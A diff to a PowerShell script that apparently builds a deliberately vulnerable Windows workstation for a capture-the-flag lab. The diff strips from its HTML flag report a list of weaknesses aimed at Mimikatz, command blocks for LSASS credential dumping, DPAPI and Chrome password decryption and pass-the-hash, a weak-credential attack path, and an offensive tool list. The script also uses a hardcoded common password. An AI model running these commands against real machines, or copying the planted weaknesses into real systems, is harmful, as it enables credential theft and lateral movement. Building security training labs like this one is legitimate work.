@@ -4,7 +4,7 @@
 
 param(
     [string]$ServerName = "WIN2019-SRV",
-    [string]$NetworkPrinter = "192.168.1.230",
+    [string]$NetworkPrinter = "192.168.148.105",
     [string]$CommonPassword = "Password123!",
     [switch]$GenerateFlagReport
 )
@@ -743,34 +743,10 @@ function Generate-FlagReport {
             <h1 style="color: white; border: none;">CTF Flag Report v5 - Windows 10 Workstation</h1>
         </div>
         
-        <div class="mimikatz">
-            <h3>Mimikatz-Specific Features (Workstation):</h3>
-            <ul>
-                <li><strong>WDigest Enabled:</strong> Plaintext passwords in LSASS memory</li>
-                <li><strong>Multiple Users Logged In:</strong> jsmith, localadmin, Administrator</li>
-                <li><strong>Debug Privileges:</strong> debuguser and developer have SeDebugPrivilege</li>
-                <li><strong>Pass-the-Hash Ready:</strong> RDP and SMB configured for PTH</li>
-                <li><strong>DPAPI Secrets:</strong> Encrypted flags for dpapi module practice</li>
-            </ul>
-        </div>
-        
-        <div class="new-vulns">
-            <h3>v5 Features:</h3>
-            <ul>
-                <li><strong>Fixed:</strong> AlwaysInstallElevated registry path creation</li>
-                <li><strong>Fixed:</strong> WinRM configuration for Private networks</li>
-                <li><strong>Added:</strong> Mimikatz practice scenarios</li>
-                <li><strong>Added:</strong> LSASS memory targets</li>
-                <li><strong>Added:</strong> DPAPI encrypted secrets</li>
-                <li><strong>Removed:</strong> Kerberoasting (replaced with Mimikatz)</li>
-            </ul>
-        </div>
-        
         <div class="stats">
             <h2>Workstation Statistics</h2>
             <p><strong>Hostname:</strong> $(hostname)</p>
             <p><strong>Total Flags:</strong> $($global:FlagList.Count)</p>
-            <p><strong>Total Points:</strong> $(($global:FlagList | Measure-Object -Property Points -Sum).Sum)</p>
             <p><strong>Easy Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Easy'}).Count)</p>
             <p><strong>Medium Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Medium'}).Count)</p>
             <p><strong>Hard Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Hard'}).Count)</p>
@@ -785,7 +761,6 @@ function Generate-FlagReport {
                     <th>Flag</th>
                     <th>Location</th>
                     <th>Description</th>
-                    <th>Points</th>
                     <th>Difficulty</th>
                     <th>Technique</th>
                 </tr>
@@ -801,7 +776,6 @@ function Generate-FlagReport {
                     <td class="flag-code">$($flag.Flag)</td>
                     <td>$($flag.Location)</td>
                     <td>$($flag.Description)</td>
-                    <td>$($flag.Points)</td>
                     <td class="$difficultyClass">$($flag.Difficulty)</td>
                     <td>$($flag.Technique)</td>
                 </tr>
@@ -811,61 +785,6 @@ function Generate-FlagReport {
     $html += @"
             </tbody>
         </table>
-        
-        <h2>Mimikatz Commands for Workstation</h2>
-        <h3>Basic Credential Dumping:</h3>
-        <pre>
-# Enable debug privilege
-privilege::debug
-
-# Dump logon passwords
-sekurlsa::logonpasswords
-
-# Get WDigest credentials (plaintext)
-sekurlsa::wdigest
-
-# Dump tickets
-sekurlsa::tickets
-        </pre>
-        
-        <h3>DPAPI Decryption:</h3>
-        <pre>
-# Get DPAPI masterkeys
-sekurlsa::dpapi
-
-# Decrypt DPAPI blob
-dpapi::blob /in:C:\Users\Public\Documents\dpapi_flag.bin
-
-# Chrome passwords
-dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data"
-        </pre>
-        
-        <h3>Pass-the-Hash from Workstation:</h3>
-        <pre>
-# PTH with NTLM hash
-sekurlsa::pth /user:localadmin /ntlm:HASH /domain:. /run:cmd.exe
-
-# PTH to server
-sekurlsa::pth /user:Administrator /ntlm:HASH /domain:. /run:"mstsc /v:$ServerName"
-        </pre>
-        
-        <h2>Attack Path Suggestions</h2>
-        <ol>
-            <li><strong>Initial Access:</strong> RDP with weak credentials (jsmith/Welcome1)</li>
-            <li><strong>Privilege Escalation:</strong> Unquoted service paths or AlwaysInstallElevated</li>
-            <li><strong>Credential Extraction:</strong> Run Mimikatz to dump LSASS</li>
-            <li><strong>Lateral Movement:</strong> Pass-the-Hash to server using admin hashes</li>
-            <li><strong>Persistence:</strong> Create scheduled tasks with harvested credentials</li>
-        </ol>
-        
-        <h2>Tools for This Workstation</h2>
-        <ul>
-            <li><strong>Mimikatz:</strong> Latest version for all credential attacks</li>
-            <li><strong>Invoke-Mimikatz:</strong> PowerShell version for stealth</li>
-            <li><strong>LaZagne:</strong> Alternative for browser/application passwords</li>
-            <li><strong>ProcDump:</strong> Dump LSASS for offline analysis</li>
-            <li><strong>PowerSploit:</strong> Invoke-Mimikatz and other post-exploitation</li>
-        </ul>
     </div>
 </body>
 </html>
@@ -977,7 +896,7 @@ Write-Host "  Configured to connect to: $ServerName" -ForegroundColor Yellow
 Write-Host "  Network drive mapped: Z:" -ForegroundColor Yellow
 Write-Host ""
 if ($GenerateFlagReport) {
-    Write-Host "Flag reports generated! Check HTML for Mimikatz guide." -ForegroundColor Green
+    Write-Host "Flag reports generated!" -ForegroundColor Green
 }
 Write-Host ""
 Write-Host "REMINDER: This workstation is now EXTREMELY VULNERABLE!" -ForegroundColor Red
